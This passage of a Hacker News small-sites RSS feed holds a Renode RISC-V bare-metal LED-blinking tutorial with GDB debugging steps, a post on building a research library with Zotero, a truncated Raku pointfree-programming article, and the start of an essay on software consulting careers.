<p>Alternatives such as QEMU aren't as optimized for the embedded space.</p>
<p>An emulator that you might use for playing video game ROMs is specialized for a single platform. For example, in an emulator cpu, graphics chips, audio, memory-map, etc are fixed and optimized. Renode on the other hand configures each platform with a config file.</p>
</div>
</div>
<div id="source-code">
<h2><a href="#id8">Source code</a></h2>
<p>To get started you will need to clone the repository. This includes all of the examples as well as the source for Renode simulator and GCC RISC-V toolchain.</p>
<p>Renode and GCC are linked via <tt>git submodule</tt> so if you use <tt><span>--recursive</span></tt> you can clone everything in one shot.</p>
<div><pre><span></span>git clone --recursive https://github.com/y2kbugger/baremetal-riscv-renode.git
</pre></div>
</div>


<div id="blinking-a-virtual-led">
<h2><a href="#id13">Blinking a virtual LED</a></h2>
<p>To verify and get familiar with the tools we'll start off with the "Hello, World" of hardware projects: blinking an LED.</p>
<p>Blinking a virtual "LED" involves a few steps:</p>
<ol>
<li>Build <strong>image</strong> from source code</li>
<li>Launch the hardware <strong>simulator</strong> configured by the platform (repl) file</li>
<li>Load the image into <strong>RAM</strong> of the simulator</li>
</ol>
<div id="just-get-it-running">
<h3><a href="#id14">Just get it running</a></h3>
<p>First open up the project folder:</p>
<pre>$ cd 1_blinky
</pre>
<p>Then following command will handle all steps 1-3, we'll break this down later:</p>
<pre>$ make launch
</pre>
<p>If everything went correctly, you should see something like this:</p>
<p><img alt="blinky demo running" src="https://lh3.googleusercontent.com/pw/ACtC-3dKs20yaz1biM2MWXyi7HAcI0pb-BHYDYD1XM92Al11dQPQ26OJY8YULAlHPHtduGETCN5Y5D6aXtkiFi3-9tB3RNtj4A687SGo765evyqri2TjKMCyQeNSLNfZ-SV52yXlIEar9iQj2aEzPKAmBGrQOA=w628-h449-no"></p><p>You should have also noticed the monitor window open up. This is used to control the running renode machine; the <tt>?</tt> command will list the rest. The tab completion is also very helpful.</p>
<p><img alt="renode monitor" src="https://lh3.googleusercontent.com/pw/ACtC-3f6eXxClG8aqr6wk2twPPD-lXLA7C4vskcZkecZVwPlqSYNCrxrdtvzBSEgK0YLixLm3OuJzJeM63alK8B1ATSZUp594xdfz2u8-vQeMlTSLMRl_ihZHDEQtH4scresowV29jguNfTZpzdqeX1sTttQng=w442-h197-no"></p><p>Quit using <tt>q</tt> or <tt>quit</tt>:</p>
<pre>(vexriscv-machine) quit
</pre>
<p>Alternatively you can kill renode using <tt>CTRL</tt> + <tt>C</tt> in the terminal that you launched it from.</p>
</div>
<div id="hardware-configuration">
<h3><a href="#id15">Hardware configuration</a></h3>
<p>The hardware to will be simulated is defined using a renode specific platform description format <a href="#renode-describing-platforms" id="id1">[3]</a></p>
<p>vexriscv.repl:</p>
<pre>mem: Memory.MappedMemory @ sysbus 0x0
    size: 0x00040000

cpu: CPU.VexRiscv @ sysbus

gpio_out: GPIOPort.LiteX_GPIO @ sysbus 0x60000800
    type: Type.Out
    0 -&gt; led0@0
    1 -&gt; led1@0

led0 : Miscellaneous.LED @ gpio_out 0
led1 : Miscellaneous.LED @ gpio_out 1
</pre>
<p>I like this because we can make a very minimal hardware configuration, free from any vendor specific complexity. Besides the cpu and memory, we have a general purpose input output (GPIO) register mapped to memory location <tt>0x60000800</tt>. The <tt><span>-&gt;</span></tt> makes a connection from the GPIO pins to the LEDs. I don't exactly know why we need both <tt>0 <span>-&gt;</span> led0@0</tt> and <tt>@ gpio_out 0</tt> as it seems redundant; if anyone knows, please let me know. You'll also commonly see  <tt><span>-&gt;</span></tt> used for connecting interrupts.</p>
<p>To toggle the LED we will need to write a driver that knows how to control the GPIO by writing to it's register.</p>
</div>
<div id="blinky-source-code">
<h3><a href="#id16">Blinky source code</a></h3>
<p>This initial program is written exclusively in RISC-V assembly <a href="#riscv-prgrammers-guide" id="id2">[4]</a> this is simple enough that every instruction that gets executed can be traced to this source file.</p>
<p>The code to drive this GPIO device is dead simple, you just need to write data to the memory location that maps to the GPIO pins.</p>
<p>Note that the platform specifies the mapping of <tt>0x60000800</tt> to the GPIO register.</p>
<p>baremetal.s:</p>
<div><pre><span></span><span>.equ</span> <span>LED</span><span>,</span> <span>0x60000800</span>
<span>.equ</span> <span>DELAY_COUNT</span><span>,</span> <span>9000000</span>
<span>.equ</span> <span>LED_STATE_INITIAL</span><span>,</span> <span>0</span><span>b00</span>
<span>.equ</span> <span>LED_STATE_TOGGLE_MASK</span><span>,</span> <span>0</span><span>b01</span>

<span>.section</span> <span>.text</span>
<span>.global</span> <span>_start</span>
<span>_start:</span>
        <span>li</span> <span>a5</span><span>,</span> <span>LED</span>
        <span>li</span> <span>a4</span><span>,</span> <span>LED_STATE_INITIAL</span>
        <span>li</span> <span>a6</span><span>,</span> <span>LED_STATE_TOGGLE_MASK</span>
        <span>sw</span> <span>a4</span><span>,</span> <span>0x0</span><span>(</span><span>a5</span><span>)</span>
<span>loop:</span>
        <span>li</span> <span>a0</span><span>,</span> <span>DELAY_COUNT</span>      <span># reset counter</span>
<span>delay_loop:</span>
        <span>addi</span> <span>a0</span><span>,</span> <span>a0</span><span>,</span> <span>-</span><span>1</span>         <span># count down</span>
        <span>bnez</span> <span>a0</span><span>,</span> <span>delay_loop</span>
<span>toggle_led:</span>
        <span>lw</span> <span>a4</span><span>,</span> <span>0x0</span><span>(</span><span>a5</span><span>)</span>          <span># read in old led state</span>
        <span>xor</span> <span>a4</span><span>,</span> <span>a4</span><span>,</span> <span>a6</span>          <span># toggle led state word</span>
        <span>sw</span> <span>a4</span><span>,</span> <span>0x0</span><span>(</span><span>a5</span><span>)</span>          <span># write new state</span>
        <span>jump</span> <span>loop</span><span>,</span> <span>t0</span>
</pre></div>
</div>
</div>
<div id="building-an-elf-binary-using-gcc">
<h2><a href="#id17">Building an elf binary using gcc</a></h2>
<p>GCC will build an ELF binary based on our assembly source code. This binary is the ROM image and Renode is the emulator.</p>
<p>By default, gcc outputs a format called ELF. This format is understood and loaded by the OS, <a href="https://lwn.net/Articles/631631/">i.e. linux,</a>. Renode also has the ability to understand ELF files and will load the sections into memory and put the program counter at the right spot to start executing <a href="#renode-elf-start" id="id3">[1]</a>.</p>
<div><pre><span></span>riscv32-unknown-elf-gcc baremetal.s baremetal.c -ggdb -O0 -o image -ffreestanding -nostdlib
</pre></div>
<dl>
<dt>riscv32-unknown-elf-gcc</dt>
<dd>gnu compiler. This compiles, assembles, and links input source code. This is the special cross compiling variant that we built earlier which runs on your host architecture (e.g. x86), but outputs binaries for riscv32.</dd>
<dt>baremetal.s</dt>
<dd>Assemble source file.</dd>
</dl>
<table>
<colgroup><col>
<col>
</colgroup><tbody>
<tr><td>
<kbd><span>-g<var>gdb</var></span></kbd></td>
<td>Turn on debugging symbols so that gdb can reference memory locations by name.</td></tr>
<tr><td>
<kbd><span>-O</span></kbd></td>
<td>Sets the optimization level, 0 for off</td></tr>
<tr><td>
<kbd><span>-o <var>image</var></span></kbd></td>
<td>Name of the output ELF binary</td></tr>
<tr><td>
<kbd><span>-f<var>freestanding</var></span></kbd></td>
<td>don't use or require main. Don't assume we have an operating system.</td></tr>
<tr><td>
<kbd><span>-n<var>ostdlib</var></span></kbd></td>
<td>don't rely on c standard libraries being available.</td></tr>
</tbody>
</table>
</div>
<div id="interactively-debugging-renode">
<h2><a href="#id18">Interactively Debugging Renode</a></h2>
<p>Pause and step though code that is running on the simulator.</p>
<div id="attaching-the-gnu-debugger">
<h3><a href="#id19">Attaching the GNU Debugger</a></h3>
<p>After launching, you may attach GDB using <cite>make debug</cite>. This connects to the GDB server already running within Renode. It uses a GDB script to store default configuration, such as breaking execution and starting the text user interface or TUI, which shows source code alongside the disassembly.</p>
<div><pre><span></span>$ make launch
$ make debug
</pre></div>
<p>If you are familiar with GDB you know the power of setting breakpoint, inspecting stacks, and much much more.</p>
<div>
<p><img alt="gdb tui" src="https://lh3.googleusercontent.com/pw/ACtC-3chg3Hd7-XPkvOum0SQv3f9EZ30vjZ3BB70OMbEqWVWO9GkvjOh-sBBWg-cU_oD2xo7jj4TTvQReAX-2F4HSt6OPOur1bb06A-fQZUti-STZ0clEEkYPsCrHAhMq2rVkKLU2psnCGzE_pfs5rIWrda0xg=w454-h669-no"></p><p>GDB Text User Interface (TUI)</p>
</div>
</div>
<div id="useful-gdb-scenarios">
<h3><a href="#id20">Useful GDB scenarios</a></h3>
<p>There are a couple simple commands that I find to be useful when exploring baremetal programming.</p>
<div id="step-a-single-instruction">
<h4>Step a single instruction</h4>
<p>Type <tt>S</tt> <tt>I</tt> <tt>Enter</tt></p>

<p>To repeat the last command, just repeatedly hit <tt>Enter</tt>. This makes it easy to single step through the program.</p>
<p>You will notice that you get stuck in the delay loop, you would have to hit <tt>Enter</tt> 9,000,000 times to make it though that delay. This is not a good way to add delays since it uses 100% of the CPU. If we were building an operating system, we could utilize a hardware timer and allow programs to request sleeps through an API. During the sleep the OS could go about running other processes, and then wake up the sleeping process at the appropriate time.</p>
</div>
<div id="continue-normal-execution">
<h4>Continue normal execution</h4>

</div>
<div id="break-normal-execution">
<h4>Break normal execution</h4>
<p>Send a keyboard interrupt, e.g. <tt>CTRL</tt> + <tt>C</tt></p>
<div><pre><span></span>(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
delay_loop () at baremetal.s:13
(gdb) â–ˆ
</pre></div>
</div>
<div id="set-a-breakpoint">
<h4>Set a breakpoint</h4>
<p>You can set a breakpoint at a line or symbol. Tab completion should work here to display available symbols. So <tt>B</tt> <tt>Space</tt> <tt>T</tt> <tt>Tab</tt> <tt>Enter</tt></p>
<div><pre><span></span>(gdb) b toggle_led
Breakpoint 1 at 0x10074: file baremetal.s, line 16.
(gdb) c
Continuing.

Breakpoint 1, toggle_led () at baremetal.s:16
(gdb) â–ˆ
</pre></div>
</div>
<div id="read-registers">
<h4>Read Registers</h4>
<p>You can dump all registers,</p>
<div><pre><span></span>(gdb) info registers
    ra             0x0      0x0
    fp             0x0      0x0
    s1             0x0      0
    a0             0x24648f 2385039
    ...
    t4             0x0      0
    t5             0x0      0
    t6             0x0      0
    pc             0x1006c  0x1006c &lt;delay_loop&gt;
</pre></div>
<p>or you can print a specific one:</p>
<div><pre><span></span>(gdb) p $pc
$5 = (void (*)()) 0x10074 &lt;toggle_led&gt;
(gdb) p $a4
$6 = 2
</pre></div>
</div>
<div id="setting-a-register">
<h4>Setting a register</h4>
<p>You can mutate a register value and continue on:</p>
<div><pre><span></span>(gdb) set $pc=delay_loop
(gdb) c
Continuing.
</pre></div>
</div>
</div>
</div>
<div id="changing-the-bitmask-for-blinky">
<h2><a href="#id21">Changing the bitmask for blinky</a></h2>
<p>Let's do something fun and prove we can modify a program's state after breaking.</p>
<p>If we just run the blinky example, note that we are blinking <tt>led0</tt>:</p>
<div><pre><span></span>15:09:23.7671 [NOISY] gpio_out.led0: LED state changed to True
15:09:24.0805 [NOISY] gpio_out.led0: LED state changed to False
15:09:24.3872 [NOISY] gpio_out.led0: LED state changed to True
15:09:24.7525 [NOISY] gpio_out.led0: LED state changed to False
</pre></div>
<p>Change the bitmask:</p>
<div><pre><span></span>(gdb) set $a6=0b10
(gdb) c
Continuing.
</pre></div>
<p>Now we are blinking <tt>led1</tt> instead of <tt>led0</tt>:</p>
<div><pre><span></span>15:09:42.5007 [NOISY] gpio_out.led1: LED state changed to True
15:09:42.7653 [NOISY] gpio_out.led1: LED state changed to False
15:09:43.0602 [NOISY] gpio_out.led1: LED state changed to True
15:09:43.3263 [NOISY] gpio_out.led1: LED state changed to False
</pre></div>
</div>

<div id="next-post">
<h2><a href="#id23">Next post</a></h2>
<p>In the next post, I'll talk about alternate dev environments and how I converged on what I've described here. There are many easier and more <em>complete/integrated</em> solutions, but we have a stated goal of gaining understanding and this is a forcing function for more control over details.</p>
</div>


    </div>

    
    </div></div>]]>
            </description>
            <link>https://blog.y2kbugger.com/baremetal-riscv-renode-1.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509538</guid>
            <pubDate>Tue, 22 Dec 2020 18:34:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a Personal Research Library]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25509477">thread link</a>) | @iamacyborg
<br/>
December 22, 2020 | https://www.jacquescorbytuech.com/writing/building-personal-research-library | <a href="https://web.archive.org/web/*/https://www.jacquescorbytuech.com/writing/building-personal-research-library">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content">
<article>
<header>

</header>
<p><small><time datetime="2020-12-22T13:56:00+00:00">
      Tue 22 December 2020
    </time></small>
</p>
<div>
<p>In an excellent post by Steph Smith, titled <a href="https://blog.stephsmith.io/learning-to-write-with-confidence/">Writing is Thinking: Learning to Write with Confidence</a>, she describes what she calls the Thinking and Writing Cycle as follows:</p>
<blockquote>
<p>Writing and thinking are two peas in a powerful pod. Critical thinking leads to good writing, which leads to clearer thinking, and so on. By improving your writing, you are also improving your ability to think and vice versa.</p>
</blockquote>
<p>Earlier this year <a href="https://www.jacquescorbytuech.com/writing/zettlr-notes-zettlekasten">I started using a note taking app</a> called <a href="https://www.zettlr.com/">Zettlr</a> to write notes for all manner of things. I use it to take down notes for projects I'm working on, software I'm using, books I'm reading, articles I've read online and lots more. I also, as you can guess, have started using it to improve what I suppose can be called my capacity for critical thinking. It's been great.</p>
<p>Going hand-in-hand with writing is reading, and just like Zettlr, I've found a great open source tool that I use to keep track of what I've read<sup id="fnref:1"><a href="#fn:1">1</a></sup>, when. That tool is <a href="https://www.zotero.org/">Zotero</a>.</p>
<p><a href="https://www.jacquescorbytuech.com/images/post-images/Zotero.png"><img alt="Zotero" src="https://d33wubrfki0l68.cloudfront.net/b37efccfb0e27779a6b7e876d8c7b0cf336b472f/81f61/images/post-images/zotero.png"></a></p>
<p>Zotero lets you build a personal library of books, articles, web pages, PDF's and more with just a few clicks, and can be synced with an online account for access across multiple devices (including of any PDF you might have chosen to upload).</p>
<p>You can use <a href="https://en.wikipedia.org/wiki/Digital_object_identifier">DOI links</a> to import an article into your library with tons of useful metadata such as access dates, authors, etc.</p>
<p>There's also a useful Chrome browser extension that lets you easily bookmark web pages for future referencing.</p>
<p>There are a whole host of features for academic writing, but those are less useful for me. If you do need to keep track of a bibliography for referencing purposes though Zotero is perfect, and <a href="https://docs.zettlr.com/en/academic/citations/">works incredibly well with Zettlr</a>.</p>
<p>With many of us needing to continue to work from home, and with employers adapting to environments in which large numbers of staff may well continue to work from home, high quality asynchronous communication becomes the de-facto gold standard.</p>
<p>We all need to spend time improving the quality of our non-verbal communication. In that scenario, taking up a writing habit can only be a good thing, and building a personal research library has to be encouraged to provoke the Thinking and Writing Cycle.</p>
<p>If you're a marketer like me, I would highly recommend spending some time getting comfortable with an RSS reader like Feedly and subscribing <a href="https://statmodeling.stat.columbia.edu/">to</a> <a href="https://cxl.com/blog">great</a> <a href="https://wordtothewise.com/blog">websites</a>. I also highly recommend keeping tabs on the following journals.</p>
<ul>
<li><a href="https://journals.sagepub.com/loi/mrja?ai=2b4&amp;mi=ehikzz&amp;af=R">Journal of Marketing Research</a></li>
<li><a href="https://www.sciencedirect.com/journal/journal-of-interactive-marketing">Journal of Interactive Marketing</a></li>
<li><a href="https://www.sciencedirect.com/journal/international-journal-of-research-in-marketing">International Journal of Research in Marketing</a></li>
<li><a href="https://www.springer.com/journal/11747">Journal of the Academy of Marketing Science</a></li>
<li><a href="https://www.springer.com/journal/11129">Quantitative Marketing and Economics</a></li>
</ul>
<p>Building a reading habit is one of the best things to do, for your career and for your own personal development. </p>
<p>Read more. Document what you write. Write about it.</p>

<p>Cheers,</p>
<p><img src="https://www.jacquescorbytuech.com/images/jacques.png">
</p></div>
<div>
<h4>Subscribe for updates</h4>

<p>Updates, whenever I've got something valuable to say.</p>
</div>
</article>
</section></div>]]>
            </description>
            <link>https://www.jacquescorbytuech.com/writing/building-personal-research-library</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509477</guid>
            <pubDate>Tue, 22 Dec 2020 18:29:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Whatâ€™s the Point of Pointfree Programming?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25509468">thread link</a>) | @codesections
<br/>
December 22, 2020 | https://raku-advent.blog/2020/12/22/draft-whats-the-point-of-point-free-programming/ | <a href="https://web.archive.org/web/*/https://raku-advent.blog/2020/12/22/draft-whats-the-point-of-point-free-programming/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-963">

	

	
	<div>
		<blockquote><p>He had taken a new name for most of the usual reasons, and for a few unusual ones as well, not the least of which was the fact that names were important to him.</p></blockquote>
<p>â€” Patrick Rothfuss, <em>The Name of the Wind</em></p>
<p>If youâ€™re a programmer, thereâ€™s a good chance that names are important to you, too.  Giving variables and functions well chosen names is one of the <a href="https://dzone.com/articles/naming-conventions-from-uncle-bobs-clean-code-phil" rel="nofollow">basic tenets of writing good code</a>, and improving the quality of names is one of the first steps in <a href="https://thoughtbot.com/upcase/videos/refactoring-extraction-naming" rel="nofollow">refactoring low-quality code</a>.  And if you both are a programmer and are at all familiar with Raku (renamed from â€œPerl 6â€ in 2019), then you are even more likely to appreciate the power and importance of names.</p>
<p>This makes the appeal of <a href="http://xahlee.info/comp/point-free_programing.html" rel="nofollow">pointfree programming</a> â€“ which advocates for removing many of the names in your code â€“ a bit mysterious.  Given how helpful good names are, it can be hard to understand why youâ€™d want to eliminate them.</p>
<p>This isnâ€™t necessarily helped by some of the arguments put forward by advocates of pointfree programming (which is also sometimes called <em>tacit programming</em>).  For example, one proponent of pointfree programming <a href="https://spin.atomicobject.com/2017/09/29/point-free-notation/#.Wc5PtNDfhoc.hackernews" rel="nofollow">said</a>:</p>
<blockquote><p>Sometimes, especially in abstract situations involving higher-order functions, providing names for tangential arguments can cloud the mathematical concepts underlying what youâ€™re doing.  In these cases, point-free notation can help remove those distractions from your code.</p></blockquote>
<p>Thatâ€™s not <em>wrong</em>, but itâ€™s also not exactly helpful; when reading that, I find myself thinking â€œ<em>sometimes</em>; OK, when?  <em>in abstract situations</em>; OK, what sort of situations?â€  And it seems like Iâ€™m not the only one with a similar set of questions, as the <a href="https://news.ycombinator.com/item?id=15365214" rel="nofollow">top Hacker News comment</a> shows.  Given arguments like these, Iâ€™m not at all surprised that many programmers dismiss pointfree programming in essentially the same way <a href="https://en.wikipedia.org/wiki/Tacit_programming" rel="nofollow">Wikipedia does</a>: according to Wikipedia, pointfree programming is â€œof theoretical interestâ€ but can make code â€œunnecessarily obscureâ€.</p>
<p>This view â€“ though understandable â€“ is both mistaken and, I believe, deeply unfortunate.  Programming in a pointfree style can make code <em>far</em> more readable; done correctly, it makes code less obscure rather than more.  In the remainder of this post Iâ€™ll explain, as concretely as possible, the advantage of coding with fewer names.  To keep myself honest, Iâ€™ll also refactor a short program into pointfree style (the code will be in Raku, but both the before and after versions should be approachable to non-Raku programmers).  Finally, Iâ€™ll close by noting a handful of the ways that Rakuâ€™s â€œthereâ€™s more than one way to do itâ€ philosophy makes it easier to write clear, concise, pointfree code (if you want to).</p>
<h2>The fundamental point of pointfree</h2>
<p>I said before that names are important, and I meant it.  My claim is the one that <a href="https://slatestarcodex.com/2014/12/25/book-review-whats-wrong-with-the-world/" rel="nofollow">G.K. Chesterton (or his dog) might have made</a> if only heâ€™d cared about writing good code: we should use fewer names not because names are unimportant but precisely <em>because</em> of how important names are.</p>
<p>Letâ€™s back up for just a minute.  Why do names help with writing clear code in the first place?  Well, most basically, because good names convey information.  <code>sub f($a, $b)</code> may show you that youâ€™ve got a function that takes two arguments â€“ but it leaves you totally in the dark about what the function does or what role the arguments play.  But everything is much clearer as soon as we add names: <code>sub days-to-birthday($person, $starting-date)</code>.  Suddenly, we have a much better idea what the function is doing.  Not a perfect idea, of course; in particular, we likely have a number of questions of the sort that would be answered by adding types to the code (something <a href="https://raku.guide/#_types" rel="nofollow">Raku supports</a>).  But itâ€™s undeniable that the names added information to our code.</p>
<p>So if adding names adds info, itâ€™ll make your code clearer and easier to understand, right?  Well, sure â€¦ up to a point.  But this is the same line of thinking that leads to pages and pages of loan â€œdisclosuresâ€, each of which is designed to give you more information about the loan.  Despite these intentions, anyone who has confronted a stack of paperwork the approximate size of the Eiffel Tower can attest that the cumulative effect of this extra info is to <a href="https://www.law.upenn.edu/journals/lawreview/articles/volume159/issue3/BenShaharSchneider159U.Pa.L.Rev.647(2011).pdf" rel="nofollow">confuse readers and obscure the important details</a>.  Excessive names in code can fall into the same trap: even if each name technically adds info, the cumulative effect of too many names is confusion rather than clarity.</p>
<p>Hereâ€™s the same idea in different words: what names add to your code is not just extra <em>info</em> but also extra <em>emphasis</em>.  And the thing about emphasis â€“ whether it comes from bold, all-caps, or naming â€“ is that it loses its power when overused.  Giving everything a name is the same sort of error as writing in ALL-CAPS.  Basically, donâ€™t be this guy:</p>
<pre><code>&lt;Khassaki&gt;:      HI EVERYBODY!!!!!!!!!!  
&lt;Judge-Mental&gt;:  try pressing the Caps Lock key  
&lt;Khassaki&gt;:      O THANKS!!! ITS SO MUCH EASIER TO WRITE NOW!!!!!!!  
&lt;Judge-Mental&gt;:  f**k me  
</code></pre>
<p><a href="http://bash.org/?835030" rel="nofollow">source</a> (expurgation added, mostly to have an excuse to use the word <a href="https://www.merriam-webster.com/dictionary/expurgate" rel="nofollow">expurgation</a>).</p>
<p>I believe that the fundamental benefit of using pointfree programming techniques to write code with fewer names is that it allows the remaining names to stand out more â€“ which lets them convey <strong>more</strong> information than a sea of names would do.</p>
<h2>What does it mean to â€œunderstandâ€ a line of code?</h2>
<p>Do you understand this line of Raku code?</p>

<p>Letâ€™s imagine how a very literal programmer â€“ weâ€™ll call them Literal Larry â€“ might respond.  (Literal Larry is, of course, not intended to refer to Raku founder <a href="https://en.wikipedia.org/wiki/Larry_Wall" rel="nofollow">Larry Wall</a>.  That Larry may have been accused of various stylistic flaws over the years, but <em>never</em> of excessive literalness.)</p>
<p>Literal Larry might say, â€œOf course I understand what that line does!  Thereâ€™s a <code>$fuel</code> variable, and itâ€™s incremented by the value of the <code>$mass</code> variable.  Could it be any more obvious?â€.  But my response to Larry (convenient strawman that he is) would be, â€œYou just told me what that line <em>says</em>, but not what it <em>does</em>.  Without knowing more of the context around that line, in fact, we canâ€™t know what that line does.  Understanding that single â€“ and admittedly simple! â€“ line requires that we hold the context of other lines in our head.  Worse, because itâ€™s changing the value of one variable based on the value of another, understanding it requires us to track <em>mutable state</em> â€“ one of the fastest ways to add complexity to a piece of code.â€</p>
<p>And that sets up my second claim about coding in a pointfree style: It often reduces the amount of context/state that you need in your head to understand any given line of code.  Pointfree code reduces the reliance on context/state in two ways: first, to the extent that we totally eliminate some named variables, then we obviously no longer need to mentally track the state of those variables.  Less obviously (but arguably more importantly), a pointfree style naturally pushes you towards limiting the scope of your variables and reduces the number to keep track of at any one time.  (Youâ€™ll see this in action as we work through the example below.)</p>
<h2>A pointed example</h2>
<p>Despite keeping our discussion as practical as possible, I worry that it has drifted a bit away from the realm of the concrete.  Letâ€™s remedy that by writing some actual code!  Iâ€™ll present some code in a standard procedural style, refactor it into a more pointfree style, and discuss what we get out of the change.</p>
<p>But where should we get our <em>before</em> code?  It needs to be decently written â€“ my exchange with Literal Larry was probably enough strawmanning for one post, and I donâ€™t want you to think that the refactored version is only an improvement because the original was awful.  At the same time, it shouldnâ€™t be <em>great</em> idiomatic Raku code, because that would mean using enough of Rakuâ€™s superpowers to reduce the codeâ€™s accessibility (I want to explain whatâ€™s going on in the <em>after</em> code, but donâ€™t want to get bogged down teaching the <em>before</em>).  It should also be just the right length â€“ too short, and we wonâ€™t be able to see the advantages of reducing context; too long, and we wonâ€™t have space to walk through it in any detail.</p>
<p>Fortunately, the Raku docs provide the perfect <em>before</em> code: the <a href="https://docs.raku.org/language/101-basics" rel="nofollow">Raku by example 101</a> code.  This simple script is <em>not</em> idiomatic Raku; itâ€™s a program that does real (though minimal) work while using only the very basics of Raku syntax.  Hereâ€™s how that page describes the scriptâ€™s task:</p>
<blockquote><p>Suppose that you host a table tennis tournament. The referees tell you the results of each game in the format Player1 Player2 | 3:2, which means that Player1 won against Player2 by 3 to 2 sets. You need a script that sums up how many matches and sets each player has won to determine the overall winner.</p>
<p>The input data (stored in a file called scores.txt) looks like this:</p>
<blockquote><p>Beth Ana Charlie Dave<br>
Ana Dave | 3:0<br>
Charlie Beth | 3:1<br>
Ana Beth | 2:3<br>
Dave Charlie | 3:0<br>
Ana Charlie | 3:1<br>
Beth Dave | 0:3</p></blockquote>
<p>The first line is the list of players. Every subsequent line records a result of a match.</p></blockquote>
<p>I believe that the code should be legible, even to programmers who have not seen any Raku.  The one hint Iâ€™ll provide for those who truly havenâ€™t looked at Raku (or Perl) is that <code>@</code> indicates that a variable is array-like, <code>%</code> indicates that itâ€™s hashmap-like, and <code>$</code> is for all other variables.  If any of the other syntax gives you trouble, check out the <a href="https://docs.raku.org/language/101-basics" rel="nofollow">full walkthrough in the docs</a>.</p>
<p>Hereâ€™s the 101 version:</p>
<div>
<pre><span>use</span> v6d;
<span><span>#</span> start by printing out the header.</span>
<span>say</span> <span><span>"</span>Tournament Results:<span>\n</span><span>"</span></span>;

<span>my</span> $file  <span>=</span> <span>open</span> <span><span>'</span>scores.txt<span>'</span></span>; <span><span>#</span> get filehandle and...</span>
<span>my</span> @names <span>=</span> $file<span>.</span><span>get</span><span>.</span><span>words</span>;   <span><span>#</span> ... get players.</span>

<span>my</span> <span>%</span>matches;
<span>my</span> <span>%</span>sets;

<span>for</span> $file<span>.</span><span>lines</span> <span>-&gt;</span> $line {
    <span>next</span> <span>unless</span> $line; <span><span>#</span> ignore any empty lines</span>

    <span>my</span> ($pairing, $result) <span>=</span> $line<span>.</span><span>split</span>(<span><span>'</span> | <span>'</span></span>);
    <span>my</span> ($p1, $p2)          <span>=</span> $pairing<span>.</span><span>words</span>;
    <span>my</span> ($r1, $r2)          <span>=</span> $result<span>.</span><span>split</span>(<span><span>'</span>:<span>'</span></span>);

    <span>%</span>sets{$p1} <span>+=</span> $r1;
    <span>%</span>sets{$p2} <span>+=</span> $r2;

    <span>if</span> $r1 <span>&gt;</span> $r2 {
        <span>%</span>matches{$p1}<span>++</span>;
    } <span>else</span> {
        <span>%</span>matches{$p2}<span>++</span>;
    }
}

<span>my</span> @sorted <span>=</span> @names<span>.</span><span>sort</span>({ <span>%</span>sets{<span>$_</span>} })<span>.</span><span>sort</span>({ <span>%</span>matches{<span>$_</span>} })<span>.</span><span>reversâ€¦</span></pre></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://raku-advent.blog/2020/12/22/draft-whats-the-point-of-point-free-programming/">https://raku-advent.blog/2020/12/22/draft-whats-the-point-of-point-free-programming/</a></em></p>]]>
            </description>
            <link>https://raku-advent.blog/2020/12/22/draft-whats-the-point-of-point-free-programming/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25509468</guid>
            <pubDate>Tue, 22 Dec 2020 18:28:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hack Your Career with Consulting]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25509340">thread link</a>) | @softwaredoug
<br/>
December 22, 2020 | https://softwaredoug.com/blog/2020/12/22/hack-your-career-with-consulting.html | <a href="https://web.archive.org/web/*/https://softwaredoug.com/blog/2020/12/22/hack-your-career-with-consulting.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	  <p>Want a career full of adventure and tough technical challenges? Excited to see the world? Build a personal brand? Want to grow your ability to create trusting relationships? Consulting may be for you!</p>

<p>I want to reflect on my almost 8 years as a specialized software consultant. I worked in the search relevance space (creating smarter search engines) at <a href="http://opensourceconnections.com/">OpenSource Connections</a>, which gave me exposure to an invaluable mix of technical and soft skills. Maybe this article will inspire why (and why not) you would want to take on a consulting role.</p>



<p>Consulting initially appealed to me because I enjoyed being thrown in the deep end. My normal work assignments were too easy. In my pre-consulting job, Iâ€™d feel bored 2-3 months for every 1 month of really intense challenging work. At the time, in my early 30s, I wanted that intensity all the time.</p>

<p>I had that opportunity and then some! At OpenSource Connections I quickly became the go-to person when the client realized â€œthese search results make no sense!â€. I learned to optimize the relevance ranking of search applications, which in the early 2010s, was not something you obsessed about unless you were Amazon or Google. Lucky for me, I was in the right place at the right time to go after this niche and build a personal brand.</p>

<p>However, I soon found that thereâ€™s another side to being in this â€˜deep endâ€™.</p>

<p>I found myself on the first day of the job apologizing for a former colleagueâ€™s shoddy code. I was asked pointedly by the clientâ€™s frustrated CTO whether this was typical of our projects and how we could possibly plan to move forward from this point. Another early client was upset with why a question-answering application wasnâ€™t returning the magical results they expected. We had to come with not just a technical plan: but one to clearly communicate concrete expectations on both sides.</p>

<p>These events required me to develop skills I didnâ€™t know I needed - the ability to genuinely build trust and grow my relationship with clients. To see a low point as an opportunity to find a path forward to a better relationship. All in the context to do exciting technical feats to solve their problems.</p>

<p>Shortly after joining OpenSource Connections, my answer to <strong>why consulting?</strong> became:</p>

<ol>
  <li><strong>Nichy</strong> - Hereâ€™s a really cool niche I can define, explore, learn about!</li>
  <li><strong>Technical</strong> - The technical work is hard and touches on technical areas I care about (intersection of data science and engineering, fuzzy hard to define use cases, intersection of human psychology and technology)</li>
  <li><strong>Relationships &amp; service</strong> - I genuinely valued the hard-won relationships that came out of difficult conversations. These low points were always opportunities to demonstrate I truly cared about a value of service to the client</li>
</ol>



